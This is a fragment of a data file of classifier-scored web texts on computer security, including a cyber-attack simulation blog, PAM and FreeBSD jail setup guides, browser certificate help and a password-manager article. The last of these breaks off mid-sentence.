        "text": "Posted by Usman Sindhu on February 19, 2010 Just this Tuesday, February 16th 2010, the Bipartisan Policy Center hosted a mock cyber attack called Cyber Shockwave. The aim of this simulation was to understand the impacts of a cyber attack and assess infrastructure capability during such an incident. There are many articles explaining the motive and results of this simulation, and post mortem is still coming as we speak. So, what did the simulation entail? It depicted a war game taking place in 2011 – basically an application installed on smart phones during ‘March Madness’ thatturned out to be a malware. This hypothetical malware affected telecom and IT infrastructure throughout the country, with the result actually bringing down the nation’s cellular network...but there is more. According to an article from ‘The Atlantic Wire’: “Later, two bombs disabled the country's electricity network and destroyed gas pipelines... Soon 60 million cellphones were dead. The Internet crashed, finance and commerce collapsed, and most of the nation's electric grid went dark. White House aides discussed putting the Army in American cities.” Also, according to an article from DarkReading: “During the exercise, a server hosting the attack appeared to be based in Russia,\" said one report. \"However, the developer of the malware program was actually in the Sudan. Ultimately, the source of the attack remained unclear during the event.\" One must be thinking, it’s a pretty scary picture. Well yes, but again, it’s a simulation. What is more important is to understand how we would tackle such a scenario. Many critics argue that this simulation showed a clear inability to identify the source of this attack and therefore, inability to take immediate action. Cyber attacks are not new; they have existed from the advent of the Internet. And there is plenty of evidence to show that attacks are being launched continuously from internal and external sources. What's new here is this wave of making our critical infrastructure like utilities, healthcare, government services, education, and transportation more IT enabled or ‘Smart’. Smart infrastructure poses new risks and threats, the majority of which are not even identified yet. This simulation serves as a wakeup call and it serves to enlighten our government officials that cyber security needs to be taken seriously. We need a better risk assessment approach as a proactive measure but we also need architecture that mitigates these attacks when they happen. To drive this, multiple constituencies must come to the drawing board in early phases of smart infrastructure deployments. There are many folks that need to get involved in this ecosystem, including government officials and CIOs of infrastructure companies (utilities, telecom, etc.). The private sector faces these types of security concerns regularly. There is lot to be learned from financial, manufacturing, and retail environments. To a large extent, they also have sophisticated security and risk management techniques and technologies, with components ranging from physical hardware, software, and communication infrastructure. We’re still at an early phase of figuring this out…however, there is strong momentum at the White House as well as in security communities at large to acknowledge the importance of cyber security and collaborate to address it. One last thing: be careful installing applications during March Madness on your smart phone J ... As always, I’ll love to hear your thoughts about this and any insight you have.",
        "prob": "tensor([[1.9795e-06, 1.0000e+00]])"
    },
    {
        "text": "Security systems could be more effective if officials looked at how organisms deal with threats in the natural world, University of Arizona researchers suggest in the May 20 edition of the journal Nature. The authors are working with security and disaster management officials to help put some of their recommendations - such as decentralizing forces and forming alliances - into practice. \"Anytime you have the illusion of full security, you get adaptation,\" said Rafe Sagarin, an assistant research scientist in the UA's Institute of the Environment who is the lead author of the opinion piece. \"Terrorists figure out unexpected means of attack, hackers come up with new software to break through firewalls, and pathogens develop resistance to antibiotics.\" Instead of relying on large, centralized bureaucracies that move slowly and often lag behind in addressing threats, the authors encourage officials to look to the natural world for principles that could prove less costly, more flexible and more effective at countering threats. The security issues of modern human societies are analogous to those of many organisms, according to Sagarin and his co-authors. In nature, risks are frequent, variable and uncertain. Over billions of years, organisms have evolved an enormous variety of methods to survive, grow and proliferate on a continually changing planet. The key to their success is their ability to quickly adapt to rapidly changing threats, and change their structures, behaviors and interactions accordingly. Unlike many security agencies or entities in the human world, the most adaptable and successful organisms avoid centralization. Instead, they distribute tasks among decentralized, specialized groups of cells or individuals. Sagarin points to the octopus' camouflaging strategy to illustrate this principle: Its networks of pigment cells, distributed all over its body, react to and match the colors of the surroundings, blending the animal into the background. \"We can learn something from the octopus about the war in Iraq and Afghanistan,\" Sagarin said, specifically with regard to the threat from improvised explosive devices, or IEDs. Just like the octopus' decentralized network of pigment cells, he pointed out, troops on the ground function like independent sensors that can assess a threat more accurately, more timely and more realistically than a large, centralized organization that is geographically removed from the action and largely follows a top-down approach of command. \"The individual soldiers in the war zone are the most adaptable unit out there,\" he said. \"They are in a better position to recognize and address an emerging threat in time than a centralized bureaucracy.\" Sagarin and co-authors point out that terrorist networks such as Al Qaida have recognized the advantages of this approach and operate a loose network of largely independent subgroups. \"About 1,500 soldiers had died from roadside bomb blasts between the time troops identified the threat and the time MRAPs (mine-resistant, ambush-protected vehicles) were deployed to deal with the situation.\" Even after the blast-resistant vehicles arrived, they proved only moderately effective against a quickly moving threat that is constantly changing and rapidly adapting to new challenges. \"These MRAPs are huge, lumbering things that weigh 16 tons,\" Sagarin said, \"The insurgents, on the other hand, drive around in small pickup trucks. They quickly figured out the MRAPs were limited to certain roads and started placing roadside bombs specifically along those routes.\" Let the attacker know you're ready Another lesson could be learned by looking at how organisms deal with the constant threat from predators, according to the authors. A key feature is the capacity to reduce uncertainty and turn it into an advantage. Hunting prey uses a lot of energy, Sagarin explained, which is why predators seek to ambush their prey. As soon as the prey is aware of their presence and ready to engage in defense, a pursuit might no longer be worth it. Ground squirrels, for example, use alarm signals when a predator is lurking nearby, not only to warn their peers, but also to make it known to the attacker its cover is blown. \"When a prey species makes an alarm call of any kind, the game is up,\" Sagarin said. Suddenly, things have become a lot harder - if you're a hawk, you want to swoop down on a squirrel and not get scratched in the face.\" Remarkably, ground squirrels use alarm signals that are very specific to the threat. If the predator is a mammal (which can hear), they utter alarm calls. If it is a snake (which cannot) they use tail-flagging to signal its presence. The less specific an alarm call is, the less efficient it is in eliciting an appropriate response, the authors argue and point to the U.S. Homeland Security's threat advisory for national and international flights, which has remained at level orange (high) since August 2006. This static, ambiguous and nonspecific system creates uncertainty or indifference among the population that it is meant to help protect. Another principle often observed in nature is symbiosis, the formation of allies. \"Symbiosis is not always between friends,\" Sagarin said, pointing to the example of cleaner wrasses, small fish specializing in picking parasites off other marine animals, sometimes entering their mouths. The clients could easily swallow the cleaner wrasse while it is going about its job. \"But they don't,\" Sagarin said. \"It's a mutual beneficial relationship in which the larger fish provides the cleaner fish with a food source and protection, and the cleaner keeps it free from parasites in return.\" A lesson of how symbioses can successfully be applied in the human realm was demonstrated in Iraq in 2007, the authors note, when Gen. David Petraeus's strategy to form alliances with local leaders - including those who had been hostile - resulted in more tip-offs about IEDs and fewer American casualties. Two years ago, Sagarin and colleagues published a book titled \"Natural Security: A Darwinian Approach to a Dangerous World.\" The research group has since begun to \"make its observations more actionable for the people on the ground,\" as Sagarin put it. Working with emergency management coordinators, cybersecurity experts, soldiers, police chiefs, air marshals, homeland security officials, fire chiefs and public health officials, the group's ideas have generated a lot of interest. \"One of the main lessons we learned is that issuing challenges is more effective than giving orders when there is a need to develop security measures,\" Sagarin said. He pointed to the DARPA Grand Challenge as an example, in which the Defense Advanced Research Projects Agency of the Department of Defense put on a prize competition for the development of a driver-less vehicle capable of navigating difficult terrain on its own. \"Anytime you pose a challenge, not only do you get a diverse population of problem solvers, but you get them to learn from each another.\" However, despite decentralization, it is important to still have an overarching structure to provide guidance and encourage the development of new ideas. \"An octopus is still an octopus,\" Sagarin said, \"not just a random collection of cells.\" \"The bottom line of all this is, you can't just put up a wall around something and expect it to protect it against every possible threat. Attackers will always figure out a way.\" Explore further: 'Images of the inside of a fly' elected as computed microtomography's Best Film of the Year \"Decentralise, adapt and cooperate,\" Rafe Sagarin et al., Nature, Vol. 465, May 20, 2010. \"Natural Security - A Darwinian Approach to a Dangerous World,\" Raphael Sagarin and Terence Taylor, University of California Press, 2008.",
        "prob": "tensor([[4.7746e-05, 9.9995e-01]])"
    },
    {
        "text": "August 3, 2011: The U.S. Department of Defense has long advocated going on the offensive against criminal gangs and foreign governments that seek (and often succeed) to penetrate U.S. government and military Internet security, and steal information, or sabotage operations. Without much fanfare, the Department of Defense has made preparations to do just that. Since the military cannot afford to pay enough to recruit qualified software and Internet engineers for this sort of work, it has turned to commercial firms. There are already some out there, firms that are technically network security companies, but will also carry out offensive missions (often of questionable legality, but that has always been an aspect of the corporate security business.) Some of these firms have quietly withdrawn from the Internet security business, gone dark, and apparently turned their efforts to the more lucrative task of creating Cyber War weapons for the Pentagon. It may have been one of these firms that created, or helped create, the Stuxnet worm. An Internet worm is a computer program that constantly tries to copy itself to other computers. Stuxnet was a worm designed, very skillfully, as a weapons grade cyber weapon. The first \"real one\" as Internet security experts came to call it. While released in late 2009, Stuxnet was not discovered until last year, and engineers are still dissecting it, and continue to be amazed at what a powerful Cyber War weapon it is. Stuxnet is the first live example of a first class Cyber War weapon, which means more are on the way (or sitting on someone's hard drive waiting to be deployed.) The success of Stuxnet, and similar worms believed to be out there, may be responsible for more Internet security companies moving over to the Cyber War weapons business. The most dangerous Cyber War weapons are those that, like Stuxnet, take advantage of largely unknown Internet vulnerabilities. These allow the attacker access to many business, government and military computers. This sort of thing is called, \"using high value exploits\" (flaws in code that are not yet widely known). Finding these exploits is expensive, and requires even more skill to use. For a long time, a major source of exploits was hackers for hire. These are skilled hackers, who know they are working on the wrong side of the law, and know how to do the job, take the money, and run. This situation has developed because organized crime has discovered the Internet, and the relatively easy money to be made via Internet extortion and theft. But now commercial firms are hiring hackers and paying them good money to find and \"weaponize\" these exploits. It is believed that those nations that have Cyber War organizations, maintain arsenals of exploits. But exploits have a short shelf-life. Nearly all exploits eventually come to the attention of the publisher that created the exploitable software, and gets fixed. However, not every user applies the \"patches\", so there will always be some computers out there that are still vulnerable. But that makes \"zero day exploits\" (discovered and used for the first time) very valuable. That's because you can use these exploits on any computer with the flawed software on it. While your average zero day exploit costs up to $100,000, or more, to discover, it is not useful for very long. Thus it is expensive to maintain an exploits arsenal, as you must keep finding new exploits to replace those which are patched into ineffectiveness. Most of the Internet combat so far has been done under peacetime conditions. In wartime, it's possible (especially for the United States) to cut off enemy countries from the Internet. Thus potential American foes want to maintain an official peacetime status, so the United States cannot use its ability to cut nations off (or nearly off) from the Internet, and remove easy access to American (and Western) targets. Thus the need to make attacks discreetly, so as to make it more difficult for an enemy to target stronger attacks against you, or threaten nuclear or conventional war.",
        "prob": "tensor([[2.0600e-06, 1.0000e+00]])"
    },
    {
        "text": "Safari 6 (OS X Mountain Lion): Identify secure websites and avoid frauds When you use a website that handles private or financial information, make sure the website is encrypted. When you go to an encrypted webpage—for instance, to do online banking—Safari checks the website’s certificate and compares it with certificates that are known to be legitimate. If Safari doesn’t recognize the website’s certificate, or if the website doesn’t have one, Safari displays a warning message. Safari also checks lists of fraudulent websites that have been identified by security services. If you attempt to visit one of these websites, Safari displays a warning message. Look for a Security button A Security button near the left end of the address and search field means that the website uses the HTPPS protocol and has a digital identity certificate. Information is encrypted to keep it private as it’s sent to or from the website. The Security button, which has a lock icon inside it, can be gray or green. - A gray Security button means the website has a standard certificate. - A green Security button means the website has an Extended Validation (EV) certificate, which requires more extensive identity verification than a standard certificate. A green Security button shows the name of the EV certificate owner. To view the contents of a website’s certificate, click the Security button. Use a secure connection, if available If a Security button isn’t shown for a website, you may have been given a choice between a secure and an insecure connection when logging in to the site. Go back to the page where you logged in and check for a link to an encrypted (or secure) login. Even if you don’t plan to view private information, it’s best to use an encrypted login whenever possible to ensure that your login information and any other information you send are private. How to respond to a certificate warning - Click Show Certificate, and inspect the certificate for suspicious information. Look for a message that says the certificate is not trusted, or was signed by an untrusted issuer. If you see a message like that, click Cancel, and do not go to the website. Click the triangle next to the word “Details.” Check to make sure that the name and organization match those of the person or organization that owns the website. If anything looks unusual or is not what you expect, click Cancel, and do not go to the website. If you continue to the website, double-check the address in the Safari toolbar to confirm that it is the correct address for the page you want to visit. The name of the website should be spelled correctly. Sometimes fraudulent websites masquerade as trusted websites by changing one or two letters of the trusted website’s address. - Contact the administrator of the website, explain the problem, and request more information. If you continue, the certificate is stored on your computer, and this warning isn’t displayed again for this website until you quit and restart Safari. If you like, you can change the trust settings for the certificate later, using Keychain Access. How to respond to a warning that a website is fraudulent If Safari warns you that a website is fraudulent, do not visit that site. If you think the warning message is in error, contact the administrator or owner of the website for information. Never provide secure or personal information at a website unless you are confident that it is secure.",
        "prob": "tensor([[2.0512e-06, 1.0000e+00]])"
    },
    {
        "text": "Curtin Teaches Students Real-World Application of Forensic Computing and Cryptography On November 16, Interhack founder Matt Curtin goes to Edison Community College in Piqua, Ohio, to conduct three sessions with students on topics dealing with forensic computing and cryptography. Sometimes known as digital forensics, forensic computing is the process of analyzing data to answer specific questions for legal proceedings. In some cases, these lines of inquiry can be used to establish facts, to reconstruct information that might otherwise have been destroyed, or to offer expert opinion to the court about how to interpret certain technical facts. Matt will introduce students to an investigation conducted under his direction that identified how one company had critical information about its business stolen by an employee who was leaving the company to go to work for a competitor. Cryptography is the practice of converting information in human readable form, called \"cleartext,\" into unreadable coded format, called \"ciphertext.\" Cryptography also concerns itself with the protection of of such information. Since ancient Egypt, cryptography has been used by diplomats and armies to protect secrets. The twentieth century saw tremendous upheaval in the technology, moving away from mechanical to mathematical systems. Today, cryptography is used by organizations of all types to protect trade secrets, customer records, and other important information. In this session, Matt Curtin will walk students through the process of helping a large retailing company to identify sensitive customer information, and how to use cryptography to protect customers from identity theft and related fraud. Based in Columbus, Ohio, Interhack Corporation is a professional services firm with clients all over North America. Founded in 1997 by a team of information security researchers, Interhack accepted the mission to make global computing and communications infrastructures worthy of trust. Interhack's two practice areas, Information Assurance and Forensic Computing, support that mission. The company is a supporting member of The Usenix Association. Additional information about Interhack is available at web.interhack.com.",
        "prob": "tensor([[2.2259e-06, 1.0000e+00]])"
    },
    {
        "text": "Programs which give users access to privileges of any sort need to be able to authenticate the users. When you log into a system, you provide your name and password, and the login process uses those to authenticate the login -- to verify that you are who you say you are. Other forms of authentication than passwords are possible, and it is possible for the passwords to be stored in different ways. PAM, which stands for ``Pluggable Authentication Modules'', is a way of allowing the system administrator to set authentication policy without having to recompile programs which do authentication. With PAM, you control how the modules are plugged into the programs by editing a configuration file. Most Red Hat Linux users will never need to touch this configuration file. When you use RPM to install programs that need to do authentication, they automatically make the changes that are needed to do normal password authentication. However, you may want to customize your configuration, in which case you need to understand the configuration file. There are four types of modules defined by the PAM standard. auth modules provide the actual authentication, perhaps asking for and checking a password, and set ``credentials'' such as group membership or kerberos ``tickets''. account modules check to make sure that the authentication is allowed (the account has not expired, the user is allowed to log in at this time of day, etc.). password modules are used to set passwords. session modules are used once a user has been authenticated to make it possible for them to use their account, perhaps mounting the user's home directory or making their mailbox available. These modules may be stacked, so that multiple modules are used. For instance, rlogin normally makes use of at least two authentication methods: if ``rhosts'' authentication succeeds, it is sufficient to allow the connection; if it fails, then standard password authentication is done. New modules can be added at any time, and PAM-aware applications can then be made to use them. For instance, if you have a one-time-password calculator system, and you can write a module to support it (documentation on writing modules is included with the system), PAM-aware programs can use the new module and work with the new one-time-password calculators without being recompiled or otherwise modified in any way. Each program which uses PAM defines its own ``service'' name. The login program defines the service type login, ftpd defines the service type ftp, etc. In general, the service type is the name of the program used to access the service, not (if there is a difference) the program used to provide the service. The directory /etc/pam.d is used to configure all PAM applications. (This used to be /etc/pam.conf in earlier PAM versions; while the pam.conf file is still read if no /etc/pam.d/ entry is found, its use is deprecated.) Each application (really, each service) has its own file. A file looks like this: #auth required /lib/security/pamsecuretty.so auth required /lib/security/pampwdb.so shadow nullok auth required /lib/security/pamnologin.so account required /lib/security/pampwdb.so password required /lib/security/pamcracklib.so password required /lib/security/pampwdb.so shadow ¬ nullok useauthtok session required /lib/security/pampwdb.so The first line is a comment. Any line that starts with a # character is a comment. Lines two through four stack up three modules to use for login authorization. Line two makes sure that if the user is trying to log in as root, the tty on which they are logging in is listed in the /etc/securetty file if that file exists. Line three causes the user to be asked for a password and the password checked. Line four checks to see if the file /etc/nologin exists, and if it does, displays the contents of the file, and if the user is not root, does not let him or her log in. Note that all three modules are checked, even if the first module fails. This is a security decision---it is designed to not let the user know why their authentication was disallowed, because knowing why it was disallowed might allow them to break the authentication more easily. You can change this behavior by changing required to requisite; if any requisite module returns failure, PAM fails immediately without calling any other modules. The fifth line causes any necessary accounting to be done. For example, if shadow passwords have been enabled, the pam_pwdb.so module will check to see if the account has expired, or if the user has not changed his or her password and the grace period for changing the password has expired. The sixth line subjects a newly-changed password to a series of tests to ensure that it cannot, for example, be easily determined by a dictionary-based password cracking program. The seventh line (which we've had to wrap) specifies that if the login program changes the user's password, it should use the pam_pwdb.so module to do so. (It will do so only if an auth module has determined that the password needs to be changed---for example, if a shadow password has expired.) The eighth and final line specifies that the pam_pwdb.so module should be used to manage the session. Currently, that module doesn't do anything; it could be replaced (or supplemented by stacking) by any necessary module. Note that the order of the lines within each file matters. While it doesn't really matter much in which order required modules are called, there are other control flags available. While optional is rarely used, and never used by default on a Red Hat Linux system, sufficient and requisite cause order to become important. Let's look at the auth configuration for rlogin: auth required /lib/security/pamsecuretty.so auth sufficient /lib/security/pamrhostsauth.so auth required /lib/security/pampwdb.so shadow nullok auth required /lib/security/pamnologin.so That looks almost like the login entry, but there's an extra line specifying an extra module, and the modules are specified in a different order. First, pam_securetty.so keeps root logins from happening on insecure terminals. This effectively disallows all root rlogin attempts. If you wish to allow them (in which case we recommend that you either not be internet-connected or be behind a good firewall), you can simply remove that line. Second, pam_nologin.so checks /etc/nologin, as specified above. Third, if pam_rhosts_auth.so authenticates the user, PAM immediately returns success to rlogin without any password checking being done. If pam_rhosts_auth.so fails to authenticate the user, that failed authentication is ignored. Finally (if pam_rhosts_auth.so has failed to authenticate the user), the pam_pwdb.so module performs normal password authentication. Note that if you do not want to prompt for a password if the securetty check fails, you can change the pam_securetty.so module from required to requisite The pam_pwdb.so module will automatically detect that you are using shadow passwords and make all necessary adjustments. Please refer to Section 11.5 for more information on the utilities that support shadow passwords. This is just an introduction to PAM. More information is included in the /usr/doc/pam* directory, including a System Administrators' Guide, a Module Writers' Manual, an Application Developers' Manual, and the PAM standard, DCE-RFC 86.0. In addition, documentation is available from the Red Hat web site, at http://www.redhat.com/linux-info/pam/.",
        "prob": "tensor([[0.0082, 0.9918]])"
    },
    {
        "text": "A new report on how states in the European Union implement ID cards has found 17 countries have made national ID cards mandatory for their citizens, while only four have not, Security Document World reports. Of the 17 countries, 13 use traditional plastic ID cards and eight have introduced new smartcard technology. Smartcards feature an embedded chip that can store more detailed information, making them a stronger security tool than conventional IDs. Smartcards can also include biometric information, which currently is one of the strongest security mechanisms available for governments to defend against counterfeit plastic cards. Of the eight countries that use smartcards, Belgium, Italy, Lithuania, Portugal, Spain and Sweden are the only ones that have introduced biometric data on to them, the report relays. Countries across the globe have introduced smart card technology to improve safety and convenience for residents. Canada was one of the leading adopters of biometric passports, using the technology to ensure more oversight and security within its borders. Related ID News:",
        "prob": "tensor([[0.0029, 0.9971]])"
    },
    {
        "text": "Publisher: Prentice Hall PTR In recent years, with the explosion of web-based applications and the ever-growing popularity of the Java programming language and related Java based technologies, there has been an increasing number of vendors offering middle-tier products on which developers could build and deploy applications. This major shift from two-tier client-server paradigm to n-Tier architecture brings many challenges, especially in the area of system security. To learn about how to secure your J2EE applications, read on. About the author Pankaj Kumar is a Software Architect at HP's Web Services management Organization and has worked extensively in the area of middleware and security. He has presented on Java and Web services technologist events ranging from SD West and SD Forum to HP World. Inside the book This book is organized into three main parts. Part one is all about basic security and the Java platform. Part two introduces the readers to the basic building blocks of the Java platform's security architecture - APIs for cryptographic operations, PKI infrastructure, access control mechanisms, Java Secure Socket Extensions, and APIs for XML. And finally, the third and final part links together the concepts introduced in part two. The first part of the book kicks off with a look at news reports and case studies to get a feel for computer and network security problems. The first chapter ends with brief description of how to enable technologies in the fight against computer crime and how application security fits into the overall scheme of things. What follows is an overview on the Java platform, consisting of J2SE and J2EE, with focus on security aspects. The second part of the book starts with an explanation of cryptographic services and the Java API supporting these services. Basic cryptographic APIs (JCA and JCE) are covered. Here you learn about the secret key and PK cryptography, message digests, Message Authentication Code, and digital signature. The following chapter discusses Java support for PKI components such as X.509 certificates, certification authorities, and certificate revocation lists. Next, you encounter an explanation of the security model used to protect resources within JVM with a Security Manager. We continue by going deeper into security with chapter six that explains SSL also known as transport layer security, protocol for securing exchange of information over unprotected networks at the transport level. In last chapter in the second part of the book the author writes about message security as a means to secure messages independent of transport. XML security standards XML Signature and XML Encryption are explained. This third part of the book starts with a discussion of the security issues in developing RMI based distributed applications. It covers the use of the security manager to limit privileges of downloaded code, SSL for transport level security and JAAS for user authentication. If you're interested in web application security you'll be glad to know that chapter nine contains information about different forms of declarative and programmatic security for Servlets and JSPs. Apache Tomcat is used to illustrate example programs. The author continues by illustrating how the EJB architecture facilitates the development of software components for assembling secure enterprise applications. BEA's WebLogic Server is used to explore security concepts. Chapter eleven talks about security issues surrounding the developing, deploying and invoking of Web services. Open source SOAP engine Apache is used to illustrate the APIs and the examples. The book closes with on overall review of the subject of the book which is analyzed from a distance, identifying patterns, general principles and relations between topics. J2EE Security is a well written book; it makes a rather difficult topic easy to understand. If you are a java programmer, a system administrator who is in charge of managing J2EE applications, a system architect, or a project manager you will definitely enjoy reading this book. It's worth every penny. By subscribing to our early morning news update, you will receive a daily digest of the latest security news published on Help Net Security. With over 500 issues so far, reading our newsletter every Monday morning will keep you up-to-date with security risks out there.",
        "prob": "tensor([[2.0813e-06, 1.0000e+00]])"
    },
    {
        "text": "FreeBSD Jailsby Mike DeGraw-Bertsch What is a Jail? Those familiar with Java recognize the security concept of a sandbox. For those that aren't, it's the concept that everyone gets a unique, well-equipped sandbox to play in, and a person in one sandbox isn't allowed into anyone else's sandbox, not even to share anything with anyone else. On FreeBSD, jails implement this concept — they keep processes in their own part of the system, denying access to anything else. A jail requires its own dedicated IP address, though, which can make life difficult for those with limited address space. If this presents you with a hardship, consider at least using won't afford you as much security, but it does help. How does this help security? Take, for example, a box with an external FTP server and the company extranet. An exploit for the server is discovered, and a cracker manages to gain root access through the FTP daemon. If the FTP server is not run in a sandbox or jail, the cracker will have access to everything on the machine, including sensitive information destined for the company's partners through the extranet. If, however, the FTP server is run in a jail, the cracker will only have access to the FTP files. There are, of course, still potential risks. If you run at secure level 0, the cracker can simply access the raw disk device and read data from there. The solution is obvious — on a box sensitive enough to require jails, use appropriate secure levels as well. This will eliminate a cracker's ability to read from or write to raw disk devices. Configuring a Jail Configuring a jail is pleasantly simple. First, ensure that your system environment is jail-friendly. Because each jail requires its own IP address, the services on your box must be configured to listen to specific addresses, not just every available address. For example, if the box's addresses are 188.8.131.52 (main) and 184.108.40.206 (jail), to get inetd to listen only on inetd_flags=\"-wW -a 220.127.116.11\" to /etc/rc.conf. If you fail to do this, conflicts may occur over the aliased IP address. For some daemons, this is not an easy process — rpcbind are two examples. If you're using these services on your box, you might consider simply running them inside of a jail of their own. After configuring all of the non-jailed daemons to listen to a specific address, reboot the machine. This will put everything into a known state, eliminating any potential for confusion. With the proper host environment in place, create the directory that will house the jail. In this example, it's /usr/jail/ftp. Now go to /usr/src and run: # make world DESTDIR=/usr/jail/ftp # cd etc # make distribution DESTDIR=/usr/jail/ftp # cd /usr/jail/ftp/dev # sh # MAKEDEV jail # cd .. # ln -sf /dev/null kernel These commands build the jail and populate it with all of the tools that your processes will need to run. Actually, they put in a lot more than just what your processes will need. For example, sendmail will all be installed, but you probably don't need them in your jail. Keep in mind, though, that it's a lot easier to take stuff out until something breaks than it is to put stuff back in until everything To configure the jail environment, you might want to copy /stand/sysinstall into /usr/jail/ftp/stand, to provide you with an easy configuration interface. I'll show you how to use it in just a second. With the system rebooted, you're now ready to configure the jail environment. Start the jail for the first time by running: # jail /usr/jail/ftp jail.hostname.com 18.104.22.168 /bin/sh This will put you at a shell prompt in your jail environment. From here, you /stand/sysinstall (literally, since refers to the jail's root directory, not the system's.) There are several configuration tasks to perform, such as setting the root password (don't make it the same as the main system root password!), adding user accounts, and configuring /etc/resolv.conf. Read jail for more configuration tasks that you'll need to perform. Keep in mind that you want to be able to log in to the environment, so consider running an SSH daemon inside the jail. Once you're done configuring the jail environment, exit the shell and the jail will be shut down. You're almost ready to start the jail \"for real.\" First, add the appropriate IP address alias. For our example, this is done via: ifconfig fxp0 inet alias 22.214.171.124 255.255.255.255 You can configure this in /etc/rc.conf to be done automatically at boot. Now, let's start the jail! This is done with two commands: # mount -t procfs proc /usr/jail/ftp/proc # jail /usr/jail/ftp jail.hostname.com 126.96.36.199 /bin/sh /etc/rc You'll see some warning messages scroll by, but don't worry about them. You can now see all the daemons running inside the jail, as indicated by the J flag shown in the ps output. If you enabled SSH within the jail, you can ssh to the jail environment. Since normal shutdown commands like halt don't work in the jail, you must take a special measure to shut the jail down. First, log in to the environment and become root. You can then kill all the processes inside the jail via kill -TERM -1 or kill t -KILL -1. You can also do this from outside the jail by manually killing any PID within the jail. You should now be able comfortably to create and use jails to secure everything from FTP daemons to DNS servers. Before we finish, there's just one more note. jail.set_hostname_allowed on pre-5.0 machines) sysctl variable determines whether or not the superuser within the jail can set the hostname. This is enabled by default, and you might consider disabling it by placing security.jail.set_hostname_allowed=0 in /usr/jail/ftp/etc/sysctl.conf. Remember that it's jail.set_hostname_allowed=0 on machines running FreeBSD-4.x! You've now seen both how jails work and how to set one up. Whether you're running multiple public services from the same box, providing login shells to untrusted users, or offering a public service on an otherwise private machine, using jails properly will help you sleep at night. Mike DeGraw-Bertsch is a security and Unix system administration consultant in the Boston, Mass. area. When he's not at a job, writing, hacking with Perl, or playing with his wireless network, he can usually be found playing goal in ice hockey. Return to the BSD DevCenter. - Trackback from loose-yourself.sharelex.com 2005-07-29 06:13:33 [View] - Trackback from loose-yourself.sharelex.com 2005-07-29 06:13:32 [View] - Trackback from klip.sharelex.com 2005-07-29 06:06:50 [View] - Trackback from http://michael.fuckner.net/me/blog/index.php?/archives/179-Verbockt,-Rechner-platt.html Verbockt, Rechner platt 2005-07-27 02:39:37 [View] - Trackback from http://mdnava.network.com.ve/archives/2_Linux_Strikes_Back_SCO_Unix_vs_Linux_World.html Linux Strikes Back (SCO Unix vs. Linux World) 2004-04-25 19:28:50 [View] core dump when starting jail 2003-11-02 18:23:51 anonymous2 [View] Freebsd Jail To good to be true? 2003-10-27 00:31:11 anonymous2 [View] 2003-10-08 07:54:24 rubeng [View] 2003-09-15 03:32:11 anonymous2 [View] Useful ; thanks for the article 2003-09-06 05:05:54 anonymous2 [View] 2003-09-05 13:11:47 anonymous2 [View] Chroot jail HOWTO for Linux 2003-09-05 13:00:09 anonymous2 [View] 2003-09-05 09:41:45 anonymous2 [View] 2003-09-05 03:01:18 otto [View]",
        "prob": "tensor([[2.1136e-06, 1.0000e+00]])"
    },
    {
        "text": "I have looked around and found no information on how Android manages to store passwords on the device. Especially Gmail passwords. I'm looking to learn how Android encrypts and stores passwords ? What key does it use and where is this key stored, and what encryption algorithm it uses. Gmail's official app doesn't store password in your device. Your password is 100% safe if you use this app. This is how it works: The password is used by Google's authentication servers for the first time ONLY. After first successful authentication, an Note: These all aren't true if you use third-party email apps for Gmail viz. Stock Email app, K-9 Mail etc. IMAP or POP protocol needs original password to authenticate users everytime. So, plain password needs to be available to email app before sending it to server. So, most of email apps store passwords in plain text (hashing/encryption is useless because hashing/encryption key needs to be stored locally). In this case, I'd recommend you to enable |show 17 more comments| Android passwords used with the built-in Email application are stored in plain text inside a SQLite Database. This is in contrast to the Gmail application, which uses Auth Tokens as described in Sachin Sekhar's answer. For Jelly Bean, the database location is: The above location varies with the Android version This location on a non-rooted device is secured and protected by the Operating System. A member from the Android Development Team posted an explanation that till today still applies: Aditionally, since this issue appears to disturb many Android users, you can also follow this discussion at Slashdot - Android Password Data Stored In Plain Text. |show 2 more comments|",
        "prob": "tensor([[2.0555e-06, 1.0000e+00]])"
    },
    {
        "text": "\"Rather than some automated tool or complex virus, Google and Wikipedia searches appear to have been the weapons used to knock down the walls guarding [Sarah Palin's] e-mail,\" according to this eWeek item. Most people are vulnerable to the type of attack that compromised Palin's email account, as Markus Jakobsson wrote recently in IT World, \"...almost all of us reuse what we may think of as “meta passwords” – the information used to reset passwords...\" Every three months about 1.5% of Yahoo's 250 million email account holders forget or lose their email login or password. This creates tens of millions of password email reset/recovery requests per year, according to this research report. This translates into a lot of wasted time in password recovery purgatory (at best) or opportunities for privacy problems and online fraud (at worst). The password security and password recovery process is vulnerable to several different types of attacks: 1) Phishing attacks - where someone mimics a trusted website usually by sending an email directing you to a \"fake site.\" There they get you to enter in personal information/ data like passwords/credit card information or social security numbers or \"meta password data\" like birthdays or mother's maiden name, name of your first pet. The phisher captures this information and uses it be assume your identity and either access your sensitive accounts or creates new accounts in your name. Lastpass protection: They protect against phishing attacks by verifying that every site you log into is the actual website you're trying to enter. When you attempt to log-in to a website using Lastpass, the password manager will highlight login/form fill fields and offer auto login only to confirmed, legitimate website where you have an account. You’ll see the Lastpass icon and highlighted fields and know it is safe to proceed. 2) Brute force attacks - where someone methodically applies password combinations in an attempt to guess your password. One popular variation of this theme is a dictionary attack where weak passwords are uncovered by simply probing your password by testing it against the words in a dictionary. Lastpass protection: They make creating, using and remembering strong passwords simple. Most people, myself included, make it too easy for brute force attacks to be successful because we use weak passwords (that are easier to remember than strong, complex ones) and reuse these weak passwords across different sites (meaning if one password is stolen/compromised, many of my sites are vulnerable). Lastpass makes it easy to use strong and unique passwords for every website. I use Lastpass to auto generate strong passwords for me and remember these passwords for me so I don’t have to. 3) \"Meta password\" attacks (a.k.a. mother's maiden name and other common password retrieval challenges). Under this increasingly common scenario, someone collects your personal information via Facebook, public record searches, ect. They use that information to figure out what they need to reset my account password and access my information. Lastpass help: The password manager enables me to change the way I answer these “meta password” questions. Basically, I can offer less personal information. Gone are the days where I enter in simple answers, now I auto generate strong password-like answers to questions like mother’s maiden name and my elementary school? I use the password generator to make up “junk” answers and save these answers in the “edit site information” notes section with each new account. Because Lastpass auto logs me in to websites I no longer have to use the meta password data to reset passwords. If I were to need to access the meta question answers, that info is securely saved and accessed from my Lastpass portal page. Because Lastpass does password management differently, they sync all my information across platforms and machines and I can still access all my account information, log-into my websites without uploading any sensitive information to their servers. So, unlike many password managers, Lastpass doesn’t require too much “trust “from me. It saves all my sensitive information and encrypts it locally on my machine. They don’t have access to any of my information, it doesn’t get saved onto their servers, it remains secure, encrypted and on my computer. It’s 